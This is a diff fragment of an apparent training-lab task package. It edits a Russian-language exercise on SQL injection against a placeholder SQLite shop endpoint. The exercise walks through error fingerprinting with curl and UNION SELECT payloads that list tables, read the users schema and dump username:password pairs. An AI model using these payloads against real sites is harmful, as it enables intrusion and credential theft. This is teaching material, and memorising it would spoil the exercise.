@@ -13,7 +13,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: SQLite-инъекция на shop.example\n\nЦель — `http://shop.example/product?id=1` (отдаёт JSON `[[id,name,price]]`).\nВ SQLite нет `information_schema`; метаданные — в `sqlite_master`.\n\n1. Диалект: `curl -s \"http://shop.example/product?id=1'\"` → `unrecognized token`.\n2. Версия: `... UNION SELECT 1,sqlite_version(),3-- -`.\n3. Таблицы: `... UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -`.\n4. Схема: `... UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'-- -`.\n5. Дамп: `... UNION SELECT 1,GROUP_CONCAT(username||':'||password),3 FROM users-- -`.\n6. Флаг: `... | grep 'nto' > found.txt` и `check`.\n"
+      "text": "# Практика: SQLite-инъекция на shop.example\n\nЦель — `http://shop.example/product?id=1` (отдаёт JSON `[[id,name,price]]`).\nВ SQLite нет `information_schema`; метаданные — в `sqlite_master`.\n\n1. Диалект: `curl -s \"http://shop.example/product?id=1'\"` → `unrecognized token`.\n2. Версия: `... UNION SELECT 1,sqlite_version(),3-- -`.\n3. Таблицы: `... UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -`.\n4. Схема: `... UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'-- -`.\n5. Дамп: `... UNION SELECT 1,GROUP_CONCAT(username||':'||password),3 FROM users-- -`.\n6. Флаг: `... | grep 'nto' > found.txt` и `check`.\n\n## Повторение (`web-sqli`)\n\nПервый шаг из `web-sqli` — **фингерпринт по ошибке** — здесь так же обязателен. Подставь кавычку:\n\n    curl -s \"http://shop.example/product?id=1'\"\n\n`unrecognized token` — характерная ошибка SQLite; метаданные тут лежат не в `information_schema`, а в `sqlite_master`.\n"
     }
   ],
   "tools": {
